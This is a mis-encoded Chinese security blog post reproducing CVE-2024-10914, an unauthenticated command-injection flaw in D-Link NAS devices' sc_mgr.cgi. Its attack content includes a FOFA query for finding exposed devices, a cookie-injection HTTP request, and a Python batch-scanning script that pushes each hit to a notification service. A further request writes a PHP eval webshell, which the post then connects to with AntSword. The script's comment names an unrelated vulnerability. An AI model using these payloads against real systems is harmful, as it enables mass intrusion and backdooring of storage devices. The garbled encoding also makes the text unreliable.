#  ã€æ·±åº¦å¤ç°ã€‘D-Link NASè®¾å¤‡ sc_mgr.cgi æœªæˆæƒRCEæ¼æ´(CVE-2024-10914)   
åŸåˆ› çº¢å²¸åŸºåœ°èµµå°é¾™  æš—å½±ç½‘å®‰å®éªŒå®¤   2024-11-21 01:00  
  
## äº§å“ç®€ä»‹  
  
  
D.LinK NASQ è®¾å¤‡æ˜¯ä¸€ç§åŸºäºç½‘ç»œçš„å­˜å‚¨è§£å†³æ–¹æ¡ˆï¼Œä½œä¸ºç½‘ç»œå­˜å‚¨è®¾å¤‡ï¼Œæ—¨åœ¨ä¸ºä¼ä¸šæä¾›å¤§å®¹é‡çš„å­˜å‚¨ç©ºé—´ï¼Œå¹¶é€šè¿‡ç½‘ç»œè¿æ¥å®ç°æ•°æ®çš„è®¿é—®å’Œç®¡ç†ã€‚è¿™ç§è®¾å¤‡ä¸ä»…æ»¡è¶³äº†ä¼ä¸šå¯¹æ•°æ®å­˜å‚¨çš„éœ€æ±‚ï¼Œè¿˜æä¾›äº†é«˜æ•ˆçš„æ•°æ®å…±äº«å’Œè®¿é—®åŠŸèƒ½ï¼Œæå‡äº†ä¼ä¸šæ•°æ®ç®¡ç†çš„æ•ˆç‡å’Œçµæ´»æ€§ã€‚å¹¿æ³›åº”ç”¨äºå„ç§ä¼ä¸šåœºæ™¯ï¼Œå¦‚æ–‡æ¡£å­˜å‚¨ã€å›¾ç‰‡å’Œè§†é¢‘å­˜å‚¨ã€æ•°æ®åº“å¤‡ä»½ç­‰ã€‚ç‰¹åˆ«æ˜¯åœ¨éœ€è¦é«˜æ•ˆæ•°æ®å…±äº«å’Œè®¿é—®çš„ä¼ä¸šç¯å¢ƒä¸­ï¼Œå¦‚è®¾è®¡å·¥ä½œå®¤ã€å¹¿å‘Šå…¬å¸ã€åŒ»ç–—æœºæ„ç­‰ï¼ŒD-Link NASè®¾å¤‡æ›´æ˜¯å‘æŒ¥äº†å…¶å¼ºå¤§çš„åŠŸèƒ½å’Œä¼˜åŠ¿  
ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwvp69e8tHbjvllPa5yxSOhj4LapyA8l3ziaEhtYsYFKayhFgLq2H0Yqw/640?wx_fmt=png&from=appmsg "")  
  
  
## æ¼æ´æ¦‚è¿°  
  
  
D-LinK NASè®¾å¤‡ /cgi-bin/sc mgrcgi?cmd=Sc Get nf0 æ¥å£å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå†™å…¥åé—¨æ–‡ä»¶ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€‚  
  
PSï¼šè¿™æ®µæ—¶é—´ï¼Œè¿å‡ºä¸¤ä¸ªD-Linkç›¸å…³æ¼æ´  
## FOFA  
  
```
body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwiasP0MweiaXDUyTwnMVaeJib4mPLSicnFGxjibcAqAITWc8YfyGmjaX7ibkg/640?wx_fmt=png&from=appmsg "")  
## æ¼æ´å¤ç°  
```
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZw7K7dxRKU9kCnYg5ibKiczTBiaLP5CzuoypO2Wd7SLrfbdSmy0dPYvfUyw/640?wx_fmt=png&from=appmsg "")  
  
## æ·±åº¦å¤ç°  
  
è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ç§çº¢å²¸çš„æ£€æµ‹å·¥å…·ï¼Œç¬¬ä¸€ä»£å’Œç¬¬ä¸‰ä»£çš„  
  
ç¬¬ä¸€ä»£ï¼Œ1ã€ä¿¡æ¯æ”¶é›†  
  
ç¬¬äºŒåˆ©ç”¨pocè¿›è¡Œæ‰¹é‡æ£€æµ‹  
```
# .py
#å¤§åæ™ºèƒ½ç‰©è”ç»¼åˆç®¡ç†å¹³å° ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°(QVD-2023-45063)
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result

key = ""

def scan_D_Link_NAS_sc_mgr_rce(url, proxies, headers, append_to_output):
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    if url.endswith("/"):
        path = "cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info"
    else:
        path = "/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    encodetext = url + path
    append_to_output("===================================================================", "green")
    append_to_output(f"æ‰«æç›®æ ‡: {url}", "yellow")
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Cookie": "username=mopfdfsewo'& id & echo 'mopfdfsewo;"
  }

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'uid' in req1.text:
            append_to_output(f"[+] {url} å­˜åœ¨D-Link NASè®¾å¤‡ sc_mgr.cgi æœªæˆæƒRCEæ¼æ´ï¼ï¼ï¼ï¼", "red")
            ret = sc_send('å‘ç°D-Link NASè®¾å¤‡ sc_mgr.cgi æœªæˆæƒRCEæ¼æ´', f"æ¼æ´è¿æ¥: {url}\r\næ¼æ´ç±»å‹: RCEæ¼æ´", key)
        else:
            append_to_output(f"[-] {url} ä¸å­˜åœ¨D-Link NASè®¾å¤‡ sc_mgr.cgi æœªæˆæƒRCEæ¼æ´", "green")
    except Timeout:
        append_to_output(f"[!] è¯·æ±‚è¶…æ—¶ï¼Œè·³è¿‡URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} è¯ä¹¦æ ¡éªŒé”™è¯¯æˆ–è€…è¯ä¹¦è¢«æ‹’ç»", "yellow")
        else:
            append_to_output(str(e), "yellow")

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZw3B5C8E1FtrZYibpnLc6cskhMWU0MDUhonibXOMM3hXic6LZZdLI6jic4Dw/640?wx_fmt=png&from=appmsg "")  
  
ç¬¬ä¸‰ä»£æ£€æµ‹è„šæœ¬  
  
å¯ä»¥ç›´æ¥è¾“å…¥fofaè¯­å¥å¯¼å…¥èµ„äº§  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwONTS9Aaa18KiakK29rS7kPXTMBV2pWNnMRAFWzGFOYVIukcyaI8z8Hg/640?wx_fmt=png&from=appmsg "")  
  
å¯¼å…¥å®Œæˆï¼Œå¯ä»¥é€‰æ‹©å¯¹åº”çš„POC  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZw7Ppic5WsVyzG6P6mCNqyfsmgcLnzyFONaq1k03ybuBm7QuBssTJKJ6Q/640?wx_fmt=png&from=appmsg "")  
  
é€‰æ‹©å¯¹åº”ä»£ç†  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwaT7DuwKGVzs4SCNhMZ5bDT9jJ7iavWjP1qU86WpAbnBZjPbd1sWfbicg/640?wx_fmt=png&from=appmsg "")  
  
è¿›è¡Œæ‰¹é‡æ£€æµ‹  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZw1S9VnSLR1ztZ914fiaTCP18oL76RpMZmekdGzrM2tPJV14deOpzo53w/640?wx_fmt=png&from=appmsg "")  
  
ç„¶åéšä¾¿æŒ‘ä¸€ä¸ªè¿›è¡Œä¸‹ä¸€æ­¥  
  
ç”±äºåˆ†å·ä¸è®©å†™å…¥åªèƒ½é€šè¿‡asciiè½¬ç   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwI7gDkEys97S8oDPBbibOwWiaAn1waS4bU3rzNt3HuoJ0PdF16HgefpYQ/640?wx_fmt=png&from=appmsg "")  
```
EXP:
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& echo -e '<?php @eval($_POST[cmd])\x3B?>' > 1.php & echo 'mopfdfsewo;
```  
  
  
èšå‰‘è¿›è¡Œè¿æ¥  
  
è·¯å¾„ä¸ºï¼šhttp://IP/cgi-bin/1.php  
  
ç”±äºæˆ‘ä»¬è¿›è¡Œäº†è½¬ç æ‰€ä»¥éœ€è¦è¿›è¡Œç¼–ç è¿æ¥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwC27KXia5LL1egBu7X36GfywoyNVI7LPj14acqWqXBrlt34XBDRXVvkA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqTbCG8qKr6aD5WHdpXaoZwoKMNaMU9nL9MrtWZALQIrcoSBdvagYWWmawBnve0G4Wnw83dYK18UQ/640?wx_fmt=png&from=appmsg "")  
  
è¿æ¥æˆåŠŸï¼  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**å…è´£å£°æ˜**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
æ–‡ç« æ‰€æ¶‰åŠå†…å®¹ï¼Œä»…ä¾›å®‰å…¨ç ”ç©¶ä¸æ•™å­¦ä¹‹ç”¨ï¼Œç”±äºä¼ æ’­ã€åˆ©ç”¨æœ¬æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚  
  
å¤§å®¶å¯¹äºç½‘ç»œå®‰å…¨æ„Ÿå…´è¶£çš„è¯ï¼Œä¸å¦¨æ¥åŠ ä¸€ä¸‹æˆ‘ä»¬çš„è€å¸ˆï¼Œæˆ‘ä»¬ä¼šå®šæœŸåœ¨ç»™å¤§å®¶åˆ†äº«  
**æ¸—é€****å·¥å…·**å’Œ  
**å®æˆ˜****æ–‡****ç« **ï¼Œè¿˜ä¼šæœ‰  
**æ¸—é€å…¬å¼€è¯¾**å¯ä»¥è¯•å¬ï¼  
  
**æ‰«ç æ·»åŠ ï¼Œæå‡è‡ªå·±ï¼**  
  
  
**ğŸ‘‡ğŸ‘‡ğŸ‘‡**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uoNRzR6lbX9iaiaEdO8Vp5RFgXLxq8zXS3H1ZtHLWrsdM8MX2noahMPrPYPuBeMnxK4m5uFMIfVA5cw/640?wx_fmt=png&from=appmsg "")  
  
åç»­ä¸€äº›æ‰“å‡»çŠ¯ç½ªæ–‡ç« ä¼šåœ¨ä¸‹æ–¹å…¬ä¼—å·å‘å¸ƒ  
  
  
